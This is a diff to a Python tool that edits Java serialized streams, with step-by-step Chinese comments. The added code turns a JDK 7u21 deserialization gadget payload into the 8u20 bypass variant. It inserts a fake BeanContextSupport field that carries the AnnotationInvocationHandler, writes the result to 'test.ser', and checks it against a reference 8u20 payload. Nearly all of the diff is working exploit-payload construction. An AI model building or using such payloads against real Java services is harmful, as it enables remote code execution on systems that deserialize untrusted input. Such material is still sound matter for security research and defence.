@@ -236,16 +236,38 @@ if __name__ == '__main__':
     payload = ""
     obj1 = ""
 
-    with open("tests/8u20.ser", "rb") as f:
+    with open("7u21.ser", "rb") as f:
         a = ObjectStream(f)
         obj = a.readContent()
-        dns = open('dns.yaml', 'w+')
-        yaml.dump(obj, dns, allow_unicode=True)
-        dns.close()
-        dns = open('dns.yaml', 'r')
-        ystr = dns.read()
 
-        aa = yaml.load(ystr, Loader=yaml.FullLoader)
+        # 第一步，向HashSet添加一个假字段，名字fake
+        signature = JavaString("Ljava/beans/beancontext/BeanContextSupport;")
+        fakeSignature = {'name': 'fake', 'signature': signature}
+        obj.javaClass.superJavaClass.fields.append(fakeSignature)
+        # 构造假的BeanContextSupport反序列化对象，注意要引用后面的AnnotationInvocationHandler
+        with open('BeanContextSupportClass.yaml', 'r') as f1:
+            BeanContextSupportClassDesc = yaml.load(f1.read(), Loader=yaml.FullLoader)
+
+        beanContextSupportObject = JavaObject(BeanContextSupportClassDesc)
+        beanContextChildPeerField = JavaField('beanContextChildPeer',
+                                              JavaString('Ljava/beans/beancontext/BeanContextChild'),
+                                              beanContextSupportObject)
+        beanContextSupportObject.fields.append([beanContextChildPeerField])
+        serializableField = JavaField('serializable', 'I', 1)
+        beanContextSupportObject.fields.append([serializableField])
+
+        # 添加objectAnnontations 数据
+        beanContextSupportObject.objectAnnotation.append(JavaEndBlock())
+        AnnotationInvocationHandler = obj.objectAnnotation[2].fields[0][0].value
+        beanContextSupportObject.objectAnnotation.append(AnnotationInvocationHandler)
+
+        # beanContextSupportObject对象添加到fake属性里
+        fakeField = JavaField('fake', fakeSignature['signature'], beanContextSupportObject)
+        obj.fields[0].append(fakeField)
+
+        with open("test.ser", 'wb') as f:
+            o = ObjectWrite(f)
+            o.writeContent(obj)
         # exit(-2)
         # d = javaContent2Yaml(obj)
         # print("------------------------------------")
@@ -259,13 +281,13 @@ if __name__ == '__main__':
         # print(e == obj)
         # print(payload)e.fields[2][0].value.fields[1][5].value
         # exit()
-    with open("test.ser", 'wb') as f:
-        o = ObjectWrite(f)
-        o.writeContent(aa)
-        pass
+
+
     with open("test.ser", 'rb') as f:
-        obj1 = ObjectStream(f).readContent()
-        print(obj1 == aa)
+        my = ObjectStream(f).readContent()
+    with open("tests/8u20.ser", 'rb') as f:
+        my1 = ObjectStream(f).readContent()
+    print(my == my1)
     # import yaml
     #
     # f = open('dns.yaml', 'w+')
